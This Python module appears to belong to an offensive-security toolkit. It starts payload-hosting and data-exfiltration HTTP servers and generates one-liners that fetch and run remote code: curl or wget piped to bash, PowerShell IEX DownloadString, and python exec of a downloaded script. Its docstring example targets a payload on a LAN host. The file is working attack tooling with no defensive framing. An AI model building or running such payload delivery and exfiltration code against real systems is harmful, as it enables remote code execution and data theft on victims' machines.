"""HTTP server utility functions."""

from __future__ import annotations

import logging

from ofx.api.httpserver.exfil import ExfilServer
from ofx.api.httpserver.payload import PayloadServer
from ofx.api.httpserver.simple import SimpleHTTPServer
from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


def start_server(
    server_type: str,
    host: str = "0.0.0.0",
    port: int = 6666,
    **kwargs: object,
) -> SimpleHTTPServer | PayloadServer | ExfilServer:
    """Start an HTTP server of the specified type.

    Factory function for creating and starting different types of HTTP servers.

    Args:
        server_type: Type of server to start ('simple', 'payload', 'exfil')
        host: IP address to bind to (default: '0.0.0.0')
        port: Port to bind to (default: 6666)
        **kwargs: Additional arguments specific to the server type

    Returns:
        Started server instance

    Raises:
        ValueError: If server_type is not recognized

    Example:
        >>> server = start_server('simple', port=8080, directory='/var/www')
        >>> print(server.url)
        http://0.0.0.0:8080
    """
    server_type = server_type.lower()

    if server_type == "simple":
        server = SimpleHTTPServer(host=host, port=port, **kwargs)
    elif server_type == "payload":
        server = PayloadServer(host=host, port=port, **kwargs)
    elif server_type == "exfil":
        server = ExfilServer(host=host, port=port, **kwargs)
    else:
        raise ValueError(
            f"Unknown server type: {server_type}. Must be 'simple', 'payload', or 'exfil'"
        )

    server.start()
    logger.info(f"Started {server_type} server at {server.url}")
    return server


def create_oneliner(
    url: str,
    method: str = "curl",
) -> str:
    """Create a one-liner command for downloading and executing a payload.

    Generates shell commands that can be used to download and execute payloads
    from the server. Supports different download methods and shell types.

    Args:
        url: URL to download from
        method: Download method ('curl', 'wget', 'powershell', 'python')

    Returns:
        One-liner command string

    Example:
        >>> cmd = create_oneliner('http://192.168.1.100:8080/payload.sh', 'curl')
        >>> print(cmd)
        curl -s http://192.168.1.100:8080/payload.sh | bash
    """
    if method == "curl":
        return f"curl -s {url} | bash"
    elif method == "wget":
        return f"wget -q -O - {url} | bash"
    elif method == "powershell":
        return (
            f"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('{url}')\""
        )
    elif method == "python":
        return f"python -c \"import urllib.request; exec(urllib.request.urlopen('{url}').read().decode())\""
    else:
        raise ValueError(
            f"Unsupported method: {method}. Supported methods are: curl, wget, powershell, python"
        )
